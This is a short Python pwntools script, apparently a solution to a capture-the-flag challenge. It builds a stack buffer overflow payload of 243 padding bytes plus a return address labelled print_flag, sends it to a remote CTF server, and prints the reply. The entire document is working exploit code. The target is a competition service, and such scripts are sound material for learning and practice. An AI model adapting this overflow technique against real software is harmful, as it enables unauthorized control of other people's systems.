from pwn import *


print_flag = p32(0x804854b)
payload = "A" * 243 + print_flag


r = remote("pwn.ctf.tamu.edu", 4322)
r.recv(1024)

r.sendline(payload)


print r.recvall()


